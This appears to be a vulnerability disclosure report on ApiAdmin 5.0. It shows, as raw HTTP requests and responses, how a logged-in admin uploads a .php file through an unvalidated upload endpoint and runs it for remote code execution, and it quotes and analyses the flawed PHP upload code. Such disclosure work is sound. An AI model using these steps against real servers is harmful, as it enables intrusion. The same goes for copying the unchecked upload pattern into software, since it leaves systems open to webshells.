# ApiAdmin 5.0 Arbitrary File Upload RCE Vulnerability Report

## Introduction to Vulnerabilities

The admin file-upload endpoint `POST /admin/Index/upload` in ApiAdmin (ThinkPHP 6-based API management platform) takes the uploaded file's extension verbatim — there is **no whitelist, blacklist or content check** — and `move_uploaded_file()` drops the file into the web-accessible directory `public/upload/Ymd/`. Any **logged-in admin user** can upload a `.php` file and reach it directly over HTTP, achieving remote code execution on the server.

## Affected Versions

- ApiAdmin `<= 5.0` (ThinkPHP 6.0, `config/apiadmin.php` `APP_VERSION` = 5.0; last release 2020)

## Utilize conditions

1. Any back-end account with admin panel access

### Step 1 — Login

```
POST /admin/Login/index HTTP/1.1
Host: 127.0.0.1:8003
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded

username=root&password=sGPApShi
```

Response (`apiAuth` is the token carried as `Api-Auth` header on all later requests):

```json
{"code":1,"msg":"登录成功","data":{"id":1,"username":"root","nickname":"root","apiAuth":"de7a6434e559c53efa5b50b9cbe9b2c9", ...}}
```

### Step 2 — Upload a PHP shell

```
POST /admin/Index/upload HTTP/1.1
Host: 127.0.0.1:8003
Api-Auth: de7a6434e559c53efa5b50b9cbe9b2c9
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=----cve

------cve
Content-Disposition: form-data; name="file"; filename="cve_poc.php"
Content-Type: application/octet-stream

<?php echo 'APIADMIN_RCE_' . md5('pwn'); ?>
------cve--
```

Response — the server returns the full URL of the stored file (extension `.php` preserved, name randomized):

![image-20260826160003334](https://github.com/fangtang7/picx-images-hosting/raw/master/wookteam/image-20260826160003334.8s41nniuia.webp)

```json
{"code":1,"msg":"操作成功","data":{"fileName":"33c796e2dded06f88c5800d37d2bb792.php","fileUrl":"http:\/\/127.0.0.1:8003\/upload\/20260826\/33c796e2dded06f88c5800d37d2bb792.php"}}
```

### Step 3 — Execute the shell

```
GET /upload/20260826/33c796e2dded06f88c5800d37d2bb792.php HTTP/1.1
Host: 127.0.0.1:8003

HTTP/1.1 200 OK
APIADMIN_RCE_e4a25f7b052442a076b02ee9a1818d2e
```

The uploaded PHP file is executed by the server — RCE confirmed. The attacker can then drop any PHP backdoor (webshell) the same way.

![image-20260826160051443](https://github.com/fangtang7/picx-images-hosting/raw/master/wookteam/image-20260826160051443.232lywm4mw.webp)

## Root Cause Analysis

`app/controller/admin/Index.php:11-50` — the extension is extracted from the client-supplied filename with no validation, and the file is moved into the web root:

```php
public function upload(): Response {
    $path = '/upload/' . date('Ymd', time()) . '/';
    $name = $_FILES['file']['name'];
    $tmp_name = $_FILES['file']['tmp_name'];
    $error = $_FILES['file']['error'];
    ...
    $arr_name = explode('.', $name);
    $hz = array_pop($arr_name);                       // <-- extension taken verbatim, no whitelist
    $new_name = md5(time() . uniqid()) . '.' . $hz;
    if (!file_exists($_SERVER['DOCUMENT_ROOT'] . $path)) {
        mkdir($_SERVER['DOCUMENT_ROOT'] . $path, 0755, true);
    }
    if (move_uploaded_file($tmp_name, $_SERVER['DOCUMENT_ROOT'] . $path . $new_name)) {
        return $this->buildSuccess([
            'fileName' => $new_name,
            'fileUrl'  => $this->request->domain() . $path . $new_name
        ]);
    }
    ...
}
```

![image-20260827093316905](https://github.com/fangtang7/picx-images-hosting/raw/master/wookteam/image-20260827093316905.3yf6riywck.webp)

The vulnerability is `Index.php:36-38` + `:42`:

- `Index.php:37` — `array_pop()` keeps whatever extension the attacker sends (`.php`, `.phtml`, `.php5` …); there is no `in_array()` extension check and no `getimagesize()` content check;
- `Index.php:42` — `move_uploaded_file()` stores it under `$_SERVER['DOCUMENT_ROOT']` (= `public/`), which is directly web-served, so the file is both readable and **executed** as PHP.

The only hardening is a random filename (`md5(time().uniqid())`), which does not prevent access — the `fileUrl` is returned to the attacker in the same response.
